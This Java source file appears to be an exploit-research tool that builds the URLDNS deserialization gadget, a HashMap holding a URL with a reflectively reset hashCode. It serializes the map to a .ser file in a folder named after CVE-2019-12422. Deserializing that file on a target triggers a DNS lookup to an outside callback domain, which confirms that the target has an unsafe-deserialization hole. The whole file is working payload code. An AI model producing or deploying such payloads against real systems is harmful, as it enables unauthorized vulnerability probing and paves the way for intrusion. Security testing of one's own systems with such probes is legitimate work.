package cmisl.exp;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        URL url = new URL("http://ezrauevjka.zaza.eu.org");
        Class<? extends URL> aClass = url.getClass();
        Field hashCode = aClass.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url, 1);
        HashMap hashMap = new HashMap();
        hashMap.put(url, 1);
        hashCode.set(url, -1);
        Serialize(hashMap);
//        UnSerialize("./SpringBoot/src/main/java/cmisl/exp/URLDNS.ser");
    }

    public static void Serialize(Object o) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./CVE-2019-12422/src/main/java/cmisl/exp/URLDNS.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(o);
    }

    public static Object UnSerialize(String path) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(path);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        return objectInputStream.readObject();
    }
}
